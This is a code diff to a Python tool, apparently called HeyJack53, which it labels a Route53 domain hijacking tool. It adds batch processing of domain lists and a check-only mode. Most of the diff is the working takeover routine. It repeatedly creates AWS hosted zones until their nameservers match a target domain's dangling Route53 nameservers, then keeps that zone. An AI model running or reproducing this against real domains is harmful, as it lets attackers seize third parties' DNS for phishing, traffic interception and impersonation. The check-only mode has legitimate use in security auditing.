@@ -16,6 +16,8 @@ logging.basicConfig(level=logging.INFO)
 def parse_command_line(description):
     parser = argparse.ArgumentParser(description=description)
     parser.add_argument('-d', '--domain', type=str, default=None, help='Domain to be hijacked')
+    parser.add_argument('-l', '--list', type=str, default=None, help='Comma-separated list of domains')
+    parser.add_argument('-i', '--input-file', dest='file', type=str, default=None, help='File containing list of domains (one per line)')
     parser.add_argument('-p', '--profile', type=str, default=None, help='AWS profile from ~/.aws/credentials file')
     parser.add_argument('-a', '--access', type=str, default=None, help='AWS Access Key')
     parser.add_argument('-s', '--secret', type=str, default=None, help='AWS Secret Access Key')
@@ -25,12 +27,262 @@ def parse_command_line(description):
     parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')
     parser.add_argument('-f', '--force', action='store_true', help='Force to continue if NS were already taken')
     parser.add_argument('-y', '--yes', action='store_true', help='Automatic YES answer when prompted')
-    # TODO read domains from an input file
+    parser.add_argument('-c', '--check-only', action='store_true', dest='check_only', 
+                        help='Only check if domain is vulnerable without attempting hijack')
     # TODO custom path to ~/.aws/credentials file
     # TODO quiet parameter
     # TODO output parameter to save the logs in a file
     args = parser.parse_args()
     return args
+
+
+def get_domains_list(args):
+    """Extract domains from arguments."""
+    domains = []
+    
+    if args.domain:
+        domains.append(args.domain)
+    
+    if args.list:
+        domains.extend([d.strip() for d in args.list.split(',') if d.strip()])
+    
+    if args.file:
+        try:
+            with open(args.file, 'r', encoding='utf-8') as f:
+                for line in f:
+                    stripped = line.strip()
+                    if stripped and not stripped.startswith('#'):
+                        domains.append(stripped)
+        except Exception as e:
+            logging.error(f"Error reading file {args.file}: {e}")
+            sys.exit(1)
+    
+    return domains
+
+
+def get_nameservers(domain, custom_nameservers=None, verbose=False):
+    """Get nameservers for a domain."""
+    if custom_nameservers and len(custom_nameservers) > 0 and custom_nameservers[0]:
+        return set(custom_nameservers[0])
+    
+    try:
+        if verbose:
+            logging.info(f"Querying WHOIS for {domain}...")
+        whois_domain = whois.query(domain=domain)
+        if not whois_domain:
+            logging.warning(f"{domain} does not seem to exist in WHOIS")
+            return None
+        
+        target_name_servers = whois_domain.name_servers
+        if not target_name_servers or len(target_name_servers) == 0:
+            logging.warning(f'Could not find nameservers for {domain} via WHOIS')
+            return None
+        
+        return set(target_name_servers)
+    except Exception as e:
+        logging.warning(f"WHOIS query failed for {domain}: {e}")
+        return None
+
+
+def check_aws_nameservers(nameservers):
+    """Check if nameservers belong to AWS Route53."""
+    if not nameservers:
+        return False
+    
+    for ns in nameservers:
+        if 'awsdns' in ns.lower():
+            return True
+    return False
+
+
+def check_domain_resolves(domain, verbose=False):
+    """Check if domain currently resolves via DNS."""
+    try:
+        dns.resolver.resolve(domain, 'NS')
+        if verbose:
+            logging.info(f"Domain {domain} currently resolves")
+        return True
+    except Exception as e:
+        if verbose:
+            logging.info(f"Domain {domain} does not resolve: {e}")
+        return False
+
+
+def check_vulnerability(domain, custom_nameservers=None, force=False, verbose=False):
+    """Check if a domain is vulnerable to takeover."""
+    logging.info(f'\nChecking vulnerability for: {domain}')
+    
+    nameservers = get_nameservers(domain, custom_nameservers, verbose)
+    if not nameservers:
+        logging.error(f"Could not retrieve nameservers for {domain}")
+        return False, None
+    
+    if verbose:
+        logging.info(f'Found nameservers: {nameservers}')
+    
+    if not check_aws_nameservers(nameservers):
+        logging.warning(f'{domain}: Nameservers do not belong to AWS Route53')
+        return False, None
+    
+    resolves = check_domain_resolves(domain, verbose)
+    
+    if resolves and not force:
+        logging.warning(f'{domain}: Domain currently resolves - not vulnerable (use --force to override)')
+        return False, None
+    
+    if resolves and force:
+        logging.warning(f'{domain}: Domain resolves but continuing due to --force flag')
+    
+    logging.info(f'{domain}: Domain appears vulnerable to takeover!')
+    return True, nameservers
+
+
+def attempt_hijack(domain, target_nameservers, route53_client, verbose=False):
+    """Attempt to hijack a domain by creating hosted zones."""
+    logging.info(f'\nAttempting hijack for: {domain}')
+    logging.info(f'Target nameservers: {target_nameservers}')
+    
+    counter = 0
+    created_zones = []
+    failed_zones = []
+    successful_zone = None
+    
+    try:
+        while not successful_zone:
+            counter += 1
+            if verbose:
+                logging.info(f'Attempt #{counter}')
+            elif counter % 10 == 0:
+                # Print progress every 10 attempts in non-verbose mode
+                logging.info(f'Attempt #{counter}...')
+            
+            try:
+                new_zone = route53_client.create_hosted_zone(
+                    Name=domain,
+                    HostedZoneConfig={'Comment': 'HeyJack53 domain hijack!'},
+                    CallerReference=f'HeyJack53_{domain}_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}'
+                )
+            except botocore.exceptions.ClientError as e:
+                if e.response['Error']['Code'] == 'Throttling':
+                    logging.warning('AWS API throttling - waiting 3 seconds...')
+                    time.sleep(3)
+                    continue
+                else:
+                    raise
+            
+            hosted_zone = new_zone.get('HostedZone')
+            delegation_set = new_zone.get('DelegationSet')
+            
+            if not hosted_zone or not delegation_set:
+                logging.error('Invalid response from AWS - missing HostedZone or DelegationSet')
+                continue
+            
+            hosted_zone_id = hosted_zone.get('Id')
+            new_name_servers_list = delegation_set.get('NameServers')
+            
+            if not hosted_zone_id or not new_name_servers_list:
+                logging.error('Invalid response from AWS - missing Id or NameServers')
+                continue
+            
+            created_zones.append(hosted_zone_id)
+            new_name_servers = set(new_name_servers_list)
+            
+            if verbose:
+                logging.info(f'Created zone {hosted_zone_id} with nameservers: {new_name_servers}')
+            
+            # Check if ANY target nameserver matches the new nameservers
+            # Even a single match allows DNS hijacking due to round-robin resolution
+            matching_nameservers = target_nameservers.intersection(new_name_servers)
+            
+            if len(matching_nameservers) > 0:
+                successful_zone = hosted_zone_id
+                logging.info(f'\n✓ SUCCESS after {counter} attempts!')
+                logging.info(f'Hijacked zone ID: {successful_zone}')
+                logging.info(f'Matching nameservers: {matching_nameservers}')
+                logging.info(f'All zone nameservers: {new_name_servers}')
+            else:
+                failed_zones.append(hosted_zone_id)
+                if verbose:
+                    logging.info(f'No matching nameservers - cleaning up zone {hosted_zone_id}')
+        
+        # Clean up failed zones
+        if failed_zones:
+            logging.info(f'Cleaning up {len(failed_zones)} failed zones...')
+            for zone_id in failed_zones:
+                try:
+                    route53_client.delete_hosted_zone(Id=zone_id)
+                except botocore.exceptions.ClientError as e:
+                    if e.response['Error']['Code'] == 'Throttling':
+                        logging.warning('Throttling during cleanup - waiting...')
+                        time.sleep(3)
+                        try:
+                            route53_client.delete_hosted_zone(Id=zone_id)
+                        except Exception as cleanup_error:
+                            logging.error(f'Failed to delete zone {zone_id}: {cleanup_error}')
+                    else:
+                        logging.error(f'Failed to delete zone {zone_id}: {e}')
+        
+        return successful_zone
+        
+    except KeyboardInterrupt:
+        logging.warning('\nInterrupted by user')
+        if failed_zones:
+            logging.warning(f'{len(failed_zones)} zones need cleanup')
+            cleanup = input('Delete leftover zones? (Y/n): ').strip().lower()
+            if cleanup != 'n':
+                for zone_id in failed_zones:
+                    try:
+                        route53_client.delete_hosted_zone(Id=zone_id)
+                        logging.info(f'Deleted {zone_id}')
+                    except Exception as e:
+                        logging.error(f'Failed to delete {zone_id}: {e}')
+            else:
+                logging.warning('Leftover zones:')
+                for zone_id in failed_zones:
+                    logging.warning(f'  {zone_id}')
+        return None
+    
+    except Exception as e:
+        logging.error(f"Unexpected error during hijack: {e}")
+        return None
+
+
+def process_domain(domain, args, route53_client):
+    """Process a single domain."""
+    logging.info(f'\n{"="*80}')
+    logging.info(f'Processing domain: {domain}')
+    logging.info(f'{"="*80}')
+    
+    # Check vulnerability
+    is_vulnerable, nameservers = check_vulnerability(
+        domain, 
+        args.nameserver, 
+        args.force, 
+        args.verbose
+    )
+    
+    if not is_vulnerable:
+        logging.info(f'Domain {domain} is not vulnerable or check failed')
+        return {'domain': domain, 'status': 'not_vulnerable', 'zone_id': None}
+    
+    # If check-only mode, return here
+    if args.check_only:
+        logging.info(f'Domain {domain} is VULNERABLE (check-only mode)')
+        return {'domain': domain, 'status': 'vulnerable', 'zone_id': None}
+    
+    # Attempt hijack if not in check-only mode
+    if not args.yes:
+        proceed = input(f'\nAttempt hijack for {domain}? (Y/n): ').strip().lower()
+        if proceed == 'n':
+            logging.info(f'Skipping {domain}')
+            return {'domain': domain, 'status': 'skipped', 'zone_id': None}
+    
+    zone_id = attempt_hijack(domain, nameservers, route53_client, args.verbose)
+    
+    if zone_id:
+        return {'domain': domain, 'status': 'hijacked', 'zone_id': zone_id}
+    else:
+        return {'domain': domain, 'status': 'failed', 'zone_id': None}
 
 
 def main():
@@ -56,142 +308,79 @@ def main():
     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
     """)
 
-    args = parse_command_line("Hey Jack!")
-    domain = args.domain
-    verbose = args.verbose
-    force = args.force
-    auto_yes = args.yes
-
-    if not domain:
-        logging.error("Please, provide a domain to be hijacked!")
+    args = parse_command_line("Hey Jack! - Route53 Domain Hijacking Tool")
+    
+    # Get list of domains to process
+    domains = get_domains_list(args)
+    
+    if not domains:
+        logging.error("Please provide at least one domain using -d, -l, or -i")
         sys.exit(1)
-
-    print(f'Searching for {domain} nameservers ...')
-    if not args.nameserver:
-        whois_domain = whois.query(domain=args.domain)
-        if not whois_domain:
-            logging.error(f"{domain} does not seem to exist")
-            sys.exit(1)
-        target_name_servers = whois_domain.name_servers
-        if len(target_name_servers) == 0:
-            logging.error(f'We could not find a nameserver for {domain}. You can provide them using -ns parameter.')
-    else:
-        target_name_servers = set(args.nameserver[0])
-
-    print('The following name servers were found:')
-    print(target_name_servers)
-
-    aws_dns = False
-    for ns in target_name_servers:
-        if 'awsdns' in ns:
-            aws_dns = True
-    if not aws_dns:
-        logging.error('These nameservers do not belong to an AWS Route53 hosted zones ... ')
-        sys.exit(1)
-
-    try:
-        dns.resolver.resolve(domain, 'NS')
-        print('Looks like this domain was already taken :(')
-        if not force:
-            logging.info('If it is a mistake you can continue anyway using the -f parameter')
-            sys.exit(1)
-
-    except Exception as e:
-        print('No name server resolved! Continue and Hijack this domain!!')
-
+    
+    logging.info(f'Found {len(domains)} domain(s) to process')
+    
+    # Setup AWS session
     if args.profile:
         session = boto3.Session(profile_name=args.profile)
     elif args.access and args.secret:
-        session = boto3.Session(aws_access_key_id=args.access,
-                                aws_secret_access_key=args.secret,
-                                aws_session_token=args.token)
+        session = boto3.Session(
+            aws_access_key_id=args.access,
+            aws_secret_access_key=args.secret,
+            aws_session_token=args.token
+        )
     else:
-        logging.error("AWS AUTHENTICATION NEEDED!!")
+        logging.error("AWS authentication required! Use -p for profile or -a/-s for keys")
         sys.exit(1)
-    route53 = session.client('route53')
-
-    print('\n', 80 * '-')
-    print('Everything is ready!')
-    print('Target Domain:', domain)
-    print('Target Name Servers:', " ".join(target_name_servers))
-
-    if not auto_yes:
-        proceed = ""
-        while proceed not in ['Y', 'y', 'N', 'n']:
-            proceed = input('Continue? (Y/N) \n')
-        if proceed in ['N', 'n']:
-            print('Bye bye!')
-            sys.exit(1)
-
-    print('\n', 80 * '-')
-    print('Starting HeyJack53!\n\n')
-
-    counter = 0
-    created_zones = []
-    failed_zones = []
-    successful_zone = ""
-    hijacked = False
-    try:
-        while not hijacked:
-            counter += 1
-            print('Counter', counter)
-            new_zone = route53.create_hosted_zone(Name=domain,
-                                                  HostedZoneConfig={'Comment': 'HeyJack53 domain hijack!'},
-                                                  CallerReference=f'HeyJack53_{domain}_{datetime.now()}')
-            hosted_zone_id = new_zone.get('HostedZone').get('Id')
-            created_zones.append(hosted_zone_id)
-            new_name_servers = new_zone.get('DelegationSet').get('NameServers')
-            if verbose:
-                print('New zone created with the following Name Servers:')
-                print(" ".join(new_name_servers))
-
-            intersection = set(new_name_servers).intersection(set(target_name_servers))
-            if len(intersection) == 0:
-                failed_zones.append(hosted_zone_id)
-                if verbose:
-                    print('No common Name Server. Deleting New Zone!!\n')
-
-                try:
-                    route53.delete_hosted_zone(Id=hosted_zone_id)
-                    failed_zones.remove(hosted_zone_id)
-                    if len(failed_zones) != 0:
-                        for zone in failed_zones:
-                            route53.delete_hosted_zone(Id=zone)
-
-                except botocore.exceptions.ClientError as exception_obj:
-                    if exception_obj.response['Error']['Code'] == 'Throttling':
-                        logging.warning(exception_obj.response['Error']['Message'])
-                        logging.warning('Waiting 3 seconds to continue...')
-                        time.sleep(3)
-                    else:
-                        logging.error("Unexpected ClientError exception", exception_obj)
-                        sys.exit(1)
-
-            else:
-                successful_zone = hosted_zone_id
-                print(f"Successful attempt after {counter} tries!!")
-                print("The hijacked zone is", successful_zone)
-                hijacked = True
-
-        if len(failed_zones) != 0:
-            for zone in failed_zones:
-                route53.delete_hosted_zone(Id=zone)
-
-    except KeyboardInterrupt:
-        if len(failed_zones) != 0:
-            print(f"{len(failed_zones)} were not deleted yet. Do you want to try to delete them?")
-            delete_leftover = input("Enter Y/y for yes\n")
-            if delete_leftover == "Y" or delete_leftover == "y":
-                for zone in failed_zones:
-                    route53.delete_hosted_zone(Id=zone)
-            else:
-                print("The following stale zones still exist in your AWS account:")
-                for zone in failed_zones:
-                    print(zone)
-
-    except Exception as e:
-        logging.error("Unexpected exception", e)
-        sys.exit(1)
+    
+    route53_client = session.client('route53')
+    
+    # Display mode information
+    if args.check_only:
+        logging.info('Running in CHECK-ONLY mode - no hijack attempts will be made')
+    
+    # Process each domain
+    results = []
+    for domain in domains:
+        try:
+            result = process_domain(domain, args, route53_client)
+            results.append(result)
+        except Exception as e:
+            logging.error(f'Error processing {domain}: {e}')
+            results.append({'domain': domain, 'status': 'error', 'zone_id': None})
+    
+    # Summary
+    logging.info(f'\n{"="*80}')
+    logging.info('SUMMARY')
+    logging.info(f'{"="*80}')
+    
+    vulnerable_count = sum(1 for r in results if r['status'] == 'vulnerable')
+    hijacked_count = sum(1 for r in results if r['status'] == 'hijacked')
+    failed_count = sum(1 for r in results if r['status'] in ['failed', 'not_vulnerable', 'error'])
+    skipped_count = sum(1 for r in results if r['status'] == 'skipped')
+    
+    for result in results:
+        status_icon = {
+            'vulnerable': '⚠️',
+            'hijacked': '✓',
+            'failed': '✗',
+            'not_vulnerable': '-',
+            'skipped': '○',
+            'error': '✗'
+        }.get(result['status'], '?')
+        
+        status_msg = f"{status_icon} {result['domain']}: {result['status'].upper()}"
+        if result['zone_id']:
+            status_msg += f" (Zone: {result['zone_id']})"
+        logging.info(status_msg)
+    
+    logging.info(f'\nTotal: {len(domains)} domains')
+    if args.check_only:
+        logging.info(f'Vulnerable: {vulnerable_count}')
+        logging.info(f'Not vulnerable: {failed_count}')
+    else:
+        logging.info(f'Hijacked: {hijacked_count}')
+        logging.info(f'Failed: {failed_count}')
+        logging.info(f'Skipped: {skipped_count}')
 
 
 if __name__ == '__main__':
